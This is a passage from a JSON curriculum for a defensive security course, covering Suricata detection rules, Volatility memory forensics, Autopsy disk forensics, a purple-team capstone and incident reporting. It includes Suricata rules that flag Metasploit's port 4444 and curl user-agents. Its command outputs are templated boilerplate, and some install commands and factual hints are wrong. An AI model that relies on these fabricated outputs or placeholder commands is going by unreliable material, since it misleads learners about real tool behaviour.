      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "NIDS / Snort",
        "explanation": "Write signature matching engines to inspect and alert on suspicious network traffic trends."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Network Intrusion Detection with Suricata",
        "description": "Verify system connectivity and tool installation in Ubuntu/Suricata Gateway VM.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sudo tee /etc/suricata/rules/local.rules << 'EOF'",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Fast.log displays alert 1000001 and 1000002 in real time when test traffic traverses interface."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Network Intrusion Detection with Suricata",
        "description": "Install and deploy Suricata on an Ubuntu gateway host interface. Write a custom signature file designed to trigger an alert if internal hosts attempt to route traffic to known malicious IPs or uncommon non-standard server ports, and test the rule by generating matching traffic streams from a client node.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "alert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (msg:\"CRITICAL Metasploit Default Port Detected\"; sid:1000001; rev:1;)",
            "description": "Execute alert command",
            "output": "[+] Command executed successfully.\nOutput: Fast.log displays alert 1000001 and 1000002 in real time when test traffic traverses interface."
          },
          {
            "shell": "bash",
            "cmd": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"SUSPICIOUS User-Agent curl detected\"; content:\"User-Agent|3a 20|curl\"; sid:1000002; rev:1;)",
            "description": "Execute alert command",
            "output": "[+] Command executed successfully.\nOutput: Fast.log displays alert 1000001 and 1000002 in real time when test traffic traverses interface."
          },
          {
            "shell": "bash",
            "cmd": "EOF",
            "description": "Execute EOF command",
            "output": "[+] Command executed successfully.\nOutput: Fast.log displays alert 1000001 and 1000002 in real time when test traffic traverses interface."
          },
          {
            "shell": "bash",
            "cmd": "sudo suricata -T -c /etc/suricata/suricata.yaml -v",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Fast.log displays alert 1000001 and 1000002 in real time when test traffic traverses interface."
          },
          {
            "shell": "bash",
            "cmd": "sudo tail -f /var/log/suricata/fast.log",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Fast.log displays alert 1000001 and 1000002 in real time when test traffic traverses interface."
          }
        ],
        "verification": "Fast.log displays alert 1000001 and 1000002 in real time when test traffic traverses interface.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Ubuntu/Suricata Gateway VM",
          "Suricata",
          "Fast.log displays alert 1000001 and 1000...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What is the difference between Suricata's multi-threaded architecture and traditional single-threaded Snort?",
        "hint": "Suricata leverages multiple CPU cores concurrently for multi-gigabit traffic inspection."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Network Intrusion Detection with Suricata?",
      "options": [
        "Write signature matching engines to inspect and alert on suspicious network traffic trends.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Write signature matching engines to inspect and alert on suspicious network traffic trends."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 44.",
    "eli5Story": {
      "title": "The Super-Fast Tripwire Alarm (Suricata NIDS)",
      "analogy": "Suricata is a super-fast tripwire stretched across the network highway that sounds an alert the split second it spots a known bad word!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 44",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Suricata",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Ubuntu/Suricata Gateway VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Suricata"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y suricata."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 45,
    "week": 23,
    "classNumber": 45,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 23: Digital Forensics & Memory Triage",
    "title": "Volatility Memory Analysis",
    "category": "Memory Forensics",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Extract volatile data evidence from system RAM captures to find threats that avoid disk logging.",
    "tools": [
      "Volatility 3",
      "Raw memory dump file"
    ],
    "targetEnvironment": "Forensics VM workstation",
    "topology": {
      "description": "Lab topology for Volatility Memory Analysis",
      "nodes": [
        {
          "id": "source",
          "label": "Volatility 3",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Forensics",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Memory Forensics",
        "explanation": "Extract volatile data evidence from system RAM captures to find threats that avoid disk logging."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Volatility Memory Analysis",
        "description": "Verify system connectivity and tool installation in Forensics VM workstation.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "vol -f infected_memory.raw windows.info",
            "description": "Execute vol command",
            "output": "[+] Command executed successfully.\nOutput: Hidden process unhooked via psscan; injected shellcode located in memory with malfind."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Volatility Memory Analysis",
        "description": "Load a raw memory file (.raw) taken from an infected Windows client host into Volatility 3. Run the windows.pslist plugin to find unlisted processes, and run windows.netscan to capture hidden network connections active at the time of the image snapshot.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "vol -f infected_memory.raw windows.pslist",
            "description": "Execute vol command",
            "output": "[+] Command executed successfully.\nOutput: Hidden process unhooked via psscan; injected shellcode located in memory with malfind."
          },
          {
            "shell": "bash",
            "cmd": "vol -f infected_memory.raw windows.psscan",
            "description": "Execute vol command",
            "output": "[+] Command executed successfully.\nOutput: Hidden process unhooked via psscan; injected shellcode located in memory with malfind."
          },
          {
            "shell": "bash",
            "cmd": "vol -f infected_memory.raw windows.netscan",
            "description": "Execute vol command",
            "output": "[+] Command executed successfully.\nOutput: Hidden process unhooked via psscan; injected shellcode located in memory with malfind."
          },
          {
            "shell": "bash",
            "cmd": "vol -f infected_memory.raw windows.malfind",
            "description": "Execute vol command",
            "output": "[+] Command executed successfully.\nOutput: Hidden process unhooked via psscan; injected shellcode located in memory with malfind."
          }
        ],
        "verification": "Hidden process unhooked via psscan; injected shellcode located in memory with malfind.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Forensics VM workstation",
          "Volatility 3",
          "Hidden process unhooked via psscan; inje...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why does memory analysis reveal rootkits and fileless malware that leave zero traces on disk?",
        "hint": "All executable code and memory-injected payloads must exist in RAM to execute on the CPU."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Volatility Memory Analysis?",
      "options": [
        "Extract volatile data evidence from system RAM captures to find threats that avoid disk logging.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Extract volatile data evidence from system RAM captures to find threats that avoid disk logging."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 45.",
    "eli5Story": {
      "title": "Freezing the Brain of the Computer (Volatility Memory Forensics)",
      "analogy": "When a villain erases their files on disk, their thoughts are still running inside the computer's live brain (RAM)! Volatility takes an X-ray of those thoughts!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 45",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Volatility 3",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Forensics VM workstation"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Volatility 3"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y volatility."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 46,
    "week": 23,
    "classNumber": 46,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 23: Digital Forensics & Memory Triage",
    "title": "Host-Based Artifact Forensic Collection",
    "category": "Disk Forensics",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Collect persistent system artifacts from storage drives to establish forensic timelines.",
    "tools": [
      "FTK Imager",
      "Autopsy",
      "MFT / Prefetch"
    ],
    "targetEnvironment": "Core forensics VM workstation",
    "topology": {
      "description": "Lab topology for Host-Based Artifact Forensic Collection",
      "nodes": [
        {
          "id": "source",
          "label": "FTK Imager",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Core",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Disk Forensics",
        "explanation": "Collect persistent system artifacts from storage drives to establish forensic timelines."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Host-Based Artifact Forensic Collection",
        "description": "Verify system connectivity and tool installation in Core forensics VM workstation.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# Mount raw disk image in read-only forensic mode\n# In Autopsy:\n# Parse $MFT (Master File Table) records\n# Ingest Windows Prefetch (.pf) files to prove execution timestamps\n# Inspect Shellbags to prove directory navigation history",
            "description": "Standard lab command sequence",
            "output": "Forensic timeline established showing exact execution timestamp and user directory traversal."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Host-Based Artifact Forensic Collection",
        "description": "Mount a target machine disk image within the Autopsy Forensics application suite. Locate and parse the Master File Table (MFT) timeline logs, pull down system Prefetch data blocks to prove program execution histories, and evaluate user Shellbag artifacts to track folders opened by the intruder.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# Mount raw disk image in read-only forensic mode\n# In Autopsy:\n# Parse $MFT (Master File Table) records\n# Ingest Windows Prefetch (.pf) files to prove execution timestamps\n# Inspect Shellbags to prove directory navigation history",
            "description": "Standard lab command sequence",
            "output": "Forensic timeline established showing exact execution timestamp and user directory traversal."
          }
        ],
        "verification": "Forensic timeline established showing exact execution timestamp and user directory traversal.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Core forensics VM workstation",
          "FTK Imager",
          "Forensic timeline established showing ex...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What evidentiary purpose does Windows Prefetch serve in forensic trials?",
        "hint": "It provides cryptographic proof that an executable ran, along with run count and timestamp."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Host-Based Artifact Forensic Collection?",
      "options": [
        "Collect persistent system artifacts from storage drives to establish forensic timelines.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Collect persistent system artifacts from storage drives to establish forensic timelines."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 46.",
    "eli5Story": {
      "title": "Dusting for Fingerprints on the Storage Drive (Autopsy Forensics)",
      "analogy": "Even when a thief tries to wipe the dust, their shoes left footprints in the carpet (Prefetch) and open folders (Shellbags). Autopsy finds the footprints!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 46",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with FTK Imager",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Core forensics VM workstation"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using FTK Imager"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y ftk."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 47,
    "week": 24,
    "classNumber": 47,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 24: Comprehensive Incident Response Capstone",
    "title": "Live Fire 'Purple Team' Simulation (The Incident)",
    "category": "Capstone Simulation",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Detect and isolate an active, multi-stage attack hitting a production enterprise layout.",
    "tools": [
      "Phase 1 Exploits",
      "Phase 2 Cisco Topology",
      "Phase 3 SIEM/EDR"
    ],
    "targetEnvironment": "Full master lab platform",
    "topology": {
      "description": "Lab topology for Live Fire 'Purple Team' Simulation (The Incident)",
      "nodes": [
        {
          "id": "source",
          "label": "Phase 1 Exploits",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Full",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Capstone Simulation",
        "explanation": "Detect and isolate an active, multi-stage attack hitting a production enterprise layout."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Live Fire 'Purple Team' Simulation (The Incident)",
        "description": "Verify system connectivity and tool installation in Full master lab platform.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# Automated attack emulation triggered:\n# Step 1: Recon & Port scan detected on Cisco ASA\n# Step 2: Exploitation attempt logged in Wazuh SIEM\n# Step 3: Lateral movement detected via Sysmon Event 1\n# SOC Action: Issue EDR isolation on pivot endpoint\n# Action: Block rogue external IP at perimeter ASA",
            "description": "Standard lab command sequence",
            "output": "Adversary contained within 8 minutes of breach; zero sensitive data exfiltrated."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Live Fire 'Purple Team' Simulation (The Incident)",
        "description": "Trigger an automated attack sequence targeting the hardened network topology built in Phase 2. Using only the central SIEM platform console and deployed EDR host agents, track the entry point, follow the lateral movement path across internal network segments, and isolate compromised hosts before data exfiltration occurs.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# Automated attack emulation triggered:\n# Step 1: Recon & Port scan detected on Cisco ASA\n# Step 2: Exploitation attempt logged in Wazuh SIEM\n# Step 3: Lateral movement detected via Sysmon Event 1\n# SOC Action: Issue EDR isolation on pivot endpoint\n# Action: Block rogue external IP at perimeter ASA",
            "description": "Standard lab command sequence",
            "output": "Adversary contained within 8 minutes of breach; zero sensitive data exfiltrated."
          }
        ],
        "verification": "Adversary contained within 8 minutes of breach; zero sensitive data exfiltrated.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Full master lab platform",
          "Phase 1 Exploits",
          "Adversary contained within 8 minutes of ...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why does a Purple Team exercise provide greater defensive resilience than traditional Red vs Blue tests?",
        "hint": "Offensive and defensive teams collaborate in real time to immediately remediate detection gaps."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Live Fire 'Purple Team' Simulation (The Incident)?",
      "options": [
        "Detect and isolate an active, multi-stage attack hitting a production enterprise layout.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Detect and isolate an active, multi-stage attack hitting a production enterprise layout."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 47.",
    "eli5Story": {
      "title": "The Ultimate Castle Defense Live Simulation (Purple Team)",
      "analogy": "The attackers launch everything they have at the castle walls, and the defenders watch their radar screens and lock the gates in real time!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 47",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Phase 1 Exploits",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Full master lab platform"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Phase 1 Exploits"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y phase."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 48,
    "week": 24,
    "classNumber": 48,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 24: Comprehensive Incident Response Capstone",
    "title": "Incident Reporting, Remediation, & Lessons Learned Root Cause",
    "category": "Executive Reporting",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Document a major network compromise through a professional technical incident report.",
    "tools": [
      "Markdown / Text editors",
      "Executive Templates"
    ],
    "targetEnvironment": "Documentation workstation",
    "topology": {
      "description": "Lab topology for Incident Reporting, Remediation, & Lessons Learned Root Cause",
      "nodes": [
        {
          "id": "source",
          "label": "Markdown / Text editors",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Documentation",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Executive Reporting",
        "explanation": "Document a major network compromise through a professional technical incident report."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Incident Reporting, Remediation, & Lessons Learned Root Cause",
        "description": "Verify system connectivity and tool installation in Documentation workstation.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# Compile Master Incident Report:\n# 1. Executive Summary & Business Impact Statement\n# 2. Comprehensive Attack Timeline (UTC)\n# 3. Root Cause Analysis (CVE, configuration flaw)\n# 4. Containment & Remediation Actions Taken\n# 5. Strategic Hardening Recommendations (Immediate, Short-term, Long-term)",
            "description": "Standard lab command sequence",
            "output": "Completed executive-ready Incident Response Report and Post-Mortem Root Cause Analysis."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
